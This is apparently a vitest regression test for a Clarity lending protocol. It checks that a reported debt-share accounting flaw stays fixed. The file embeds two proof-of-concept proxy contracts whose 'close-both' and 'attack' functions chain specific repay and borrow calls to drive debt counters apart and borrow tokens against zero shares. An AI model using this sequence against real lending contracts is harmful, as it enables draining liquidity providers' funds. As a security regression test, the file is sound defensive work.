import { beforeEach, describe, expect, it } from "vitest";
import { Cl, ClarityType, ClarityVersion, contractPrincipalCV } from "@stacks/transactions";
import {
  add_collateral,
  deposit,
  initialize_ir,
  initialize_lp,
  initialize_staking_reward,
  mint_token,
  mint_token_to_contract,
  set_allowed_contracts,
  set_asset_cap,
  update_supported_collateral,
} from "./utils";
import { build_price_update, init_pyth, set_initial_price, set_pyth_time_delta } from "./pyth";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const attacker = accounts.get("wallet_1")!;
const borrower = accounts.get("wallet_2")!;
const lp = accounts.get("wallet_3")!;
const proxyA = contractPrincipalCV(deployer, "poc-proxy-a");
const proxyB = contractPrincipalCV(deployer, "poc-proxy-b");

const PROXY_B = `
(define-public (add-collateral (amount uint))
  (as-contract (contract-call? .borrower-v1 add-collateral .mock-btc amount none)))

(define-public (borrow (update (buff 8192)) (amount uint))
  (as-contract (contract-call? .borrower-v1 borrow update amount none)))

(define-public (send-market (recipient principal) (amount uint))
  (as-contract (contract-call? .mock-usdc transfer amount tx-sender recipient none)))
`;

const PROXY_A = `
(define-public (add-collateral (amount uint))
  (as-contract (contract-call? .borrower-v1 add-collateral .mock-btc amount none)))

(define-public (seed-borrow (update (buff 8192)))
  (as-contract (contract-call? .borrower-v1 borrow update u53277 none)))

;; The repayment sequence that drove the counters apart, closing both positions.
(define-public (close-both (update (buff 8192)))
  (begin
    (try! (contract-call? .poc-proxy-b borrow update u8454268468))
    (try! (contract-call? .poc-proxy-b send-market .poc-proxy-a u8454268468))
    (try! (as-contract (contract-call? .borrower-v1 repay u26640 none)))
    (try! (as-contract (contract-call? .borrower-v1 repay u1 (some .poc-proxy-b))))
    (try! (as-contract (contract-call? .borrower-v1 repay u100000000000 none)))
    (try! (as-contract (contract-call? .borrower-v1 repay u100000000000 (some .poc-proxy-b))))
    (ok true)))

(define-public (attack (update (buff 8192)))
  (begin
    (try! (close-both update))
    (try! (as-contract (contract-call? .borrower-v1 borrow update u5000000000 none)))
    (try! (as-contract (contract-call? .borrower-v1 borrow update u5000000000 none)))
    (try! (as-contract (contract-call? .borrower-v1 borrow update u5000000000 none)))
    (try! (as-contract (contract-call? .borrower-v1 borrow update u5000000000 none)))
    (ok true)))
`;

const debtParams = () => {
  const result: any = simnet.callReadOnlyFn("state-v1", "get-debt-params", [], deployer).result;
  return {
    openInterest: result.value["open-interest"].value as bigint,
    totalDebtShares: result.value["total-debt-shares"].value as bigint,
  };
};

const totalBorrowedAmount = () => {
  const result: any = simnet.callReadOnlyFn(
    "state-v1",
    "get-borrow-repay-params",
    [proxyA],
    deployer,
  ).result;
  return result.value["total-borrowed-amount"].value as bigint;
};

const positionOf = (who: any) => {
  const position: any = simnet.callReadOnlyFn(
    "state-v1",
    "get-user-position",
    [who],
    deployer,
  ).result;
  return {
    shares: position.value.value["debt-shares"].value as bigint,
    borrowed: position.value.value["borrowed-amount"].value as bigint,
  };
};

const marketBalanceOf = (who: any) => {
  const balance: any = simnet.callReadOnlyFn("mock-usdc", "get-balance", [who], deployer).result;
  return balance.value.value as bigint;
};

describe("a borrow that would mint no debt shares", () => {
  beforeEach(async () => {
    init_pyth(deployer);
    set_pyth_time_delta(7200, deployer);
    set_allowed_contracts(deployer);
    set_asset_cap(deployer, 10_000_000_000_000n);
    initialize_ir(deployer);
    initialize_staking_reward(deployer);
    initialize_lp(deployer);
    await set_initial_price("mock-usdc", 1n, deployer);
    await set_initial_price("mock-btc", 1n, deployer);

    mint_token("mock-usdc", 100_000_000_000, lp);
    deposit(100_000_000_000, lp);
    update_supported_collateral("mock-btc", 70_000_000, 80_000_000, 10_000_000, 8, deployer);
    mint_token("mock-btc", 100_000_000_000, borrower);
    add_collateral("mock-btc", 10_000_000_000, deployer, borrower);
  });

  it("is refused against a market whose shares are already zeroed", () => {
    // state-v1 is immutable, so a market that reached this state keeps it. Writing the
    // buckets straight through governance reproduces that state without a live path to it.
    const lpParams: any = simnet.callReadOnlyFn("state-v1", "get-lp-params", [], deployer).result;
    const accrueParams: any = simnet.callReadOnlyFn(
      "state-v1",
      "get-accrue-interest-params",
      [],
      deployer,
    ).result;
    const poison = simnet.callPublicFn(
      "state-v1",
      "set-accrued-interest",
      [
        Cl.tuple({
          "last-accrued-block-time": Cl.uint(
            accrueParams.value.value["last-accrued-block-time"].value,
          ),
          "lp-open-interest": Cl.uint(1),
          "staked-open-interest": Cl.uint(0),
          "protocol-open-interest": Cl.uint(0),
          "total-assets": Cl.uint(lpParams.value["total-assets"].value),
        }),
      ],
      deployer,
    );
    expect(poison.result).toBeOk(Cl.bool(true));
    expect(debtParams(), "the market must start from open interest with no shares against it").toEqual(
      { openInterest: 1n, totalDebtShares: 0n },
    );

    const before = marketBalanceOf(Cl.principal(borrower));
    const result = simnet.callPublicFn(
      "borrower-v1",
      "borrow",
      [Cl.buffer(build_price_update()), Cl.uint(1_000_000_000), Cl.none()],
      borrower,
    );

    expect(
      result.result.type,
      "a borrow minting no debt shares must be refused, not settled",
    ).toBe(ClarityType.ResponseErr);
    expect(result.result).toBeErr(Cl.uint(20011));
    expect(
      marketBalanceOf(Cl.principal(borrower)) - before,
      "the refused borrow must not move market tokens",
    ).toBe(0n);
  });
});

describe("a repayment sequence that closes every position", () => {
  beforeEach(async () => {
    init_pyth(deployer);
    set_pyth_time_delta(300, deployer);
    set_allowed_contracts(deployer);
    set_asset_cap(deployer, 10_000_000_000_000n);
    const ir = simnet.callPublicFn(
      "linear-kinked-ir-v1",
      "update-ir-params",
      [
        Cl.uint(40_000_000_000),
        Cl.uint(3_100_000_000_000),
        Cl.uint(850_000_000_000),
        Cl.uint(5_000_000_000),
      ],
      deployer,
    );
    expect(ir.result).toBeOk(Cl.bool(true));
    const reserveRate = simnet.callPublicFn(
      "state-v1",
      "set-protocol-reserve-percentage",
      [Cl.uint(25_000_000)],
      deployer,
    );
    expect(reserveRate.result).toBeOk(Cl.bool(true));
    initialize_staking_reward(deployer);
    initialize_lp(deployer);
    const debtCap = simnet.callPublicFn(
      "withdrawal-caps-v1",
      "set-debt-cap",
      [Cl.uint(20_000_000)],
      deployer,
    );
    expect(debtCap.result).toBeOk(Cl.bool(true));
    await set_initial_price("mock-usdc", 1n, deployer);
    await set_initial_price("mock-btc", 1n, deployer);

    mint_token("mock-usdc", 100_000_000_000, lp);
    deposit(100_000_000_000, lp);
    update_supported_collateral("mock-btc", 70_000_000, 80_000_000, 10_000_000, 8, deployer);

    const deployB = simnet.deployContract(
      "poc-proxy-b",
      PROXY_B,
      { clarityVersion: ClarityVersion.Clarity3 },
      deployer,
    );
    expect(deployB.result.type).not.toBe(ClarityType.ResponseErr);
    const deployA = simnet.deployContract(
      "poc-proxy-a",
      PROXY_A,
      { clarityVersion: ClarityVersion.Clarity3 },
      deployer,
    );
    expect(deployA.result.type).not.toBe(ClarityType.ResponseErr);

    mint_token_to_contract("mock-btc", 1_000_000_000_000, proxyA, deployer);
    mint_token_to_contract("mock-btc", 2_000_000_000_000, proxyB, deployer);
    mint_token_to_contract("mock-usdc", 100_000, proxyA, deployer);

    expect(
      simnet.callPublicFn("poc-proxy-a", "add-collateral", [Cl.uint(1_000_000_000_000)], attacker)
        .result,
    ).toBeOk(Cl.bool(true));
    expect(
      simnet.callPublicFn("poc-proxy-b", "add-collateral", [Cl.uint(2_000_000_000_000)], attacker)
        .result,
    ).toBeOk(Cl.bool(true));

    expect(
      simnet.callPublicFn(
        "poc-proxy-a",
        "seed-borrow",
        [Cl.buffer(build_price_update())],
        attacker,
      ).result,
    ).toBeOk(Cl.bool(true));
    simnet.mineEmptyBlocks(210);
  });

  it("leaves no global principal or open interest behind", () => {
    const closed = simnet.callPublicFn(
      "poc-proxy-a",
      "close-both",
      [Cl.buffer(build_price_update(600n))],
      attacker,
    );
    expect(closed.result).toBeOk(Cl.bool(true));

    expect(positionOf(proxyA).shares, "the first position must be closed").toBe(0n);
    expect(positionOf(proxyB).shares, "the second position must be closed").toBe(0n);
    expect(
      totalBorrowedAmount(),
      "closing every position must leave no global principal behind",
    ).toBe(0n);
    expect(
      debtParams().openInterest,
      "closing every position must leave no open interest behind",
    ).toBe(0n);
  });

  it("cannot then borrow market tokens against no debt", () => {
    const before = marketBalanceOf(proxyA);
    const attack = simnet.callPublicFn(
      "poc-proxy-a",
      "attack",
      [Cl.buffer(build_price_update(600n))],
      attacker,
    );
    expect(
      attack.result.type,
      "the sequence must settle as an ordinary borrow rather than reaching a zero-share state",
    ).toBe(ClarityType.ResponseOk);

    const gained = marketBalanceOf(proxyA) - before;
    const position = positionOf(proxyA);
    expect(gained, "the sequence must still pay the borrow out").toBeGreaterThan(0n);
    expect(
      position.shares,
      "every market token paid out must be matched by debt shares the position carries",
    ).toBeGreaterThanOrEqual(gained);

    // The report's signature was debt that repay could not see at all.
    mint_token("mock-usdc", 100_000, attacker);
    const repayment = simnet.callPublicFn(
      "borrower-v1",
      "repay",
      [Cl.uint(1), Cl.some(proxyA)],
      attacker,
    );
    expect(
      repayment.result.type,
      "the resulting debt must be repayable, not invisible to repay",
    ).toBe(ClarityType.ResponseOk);
  });
});
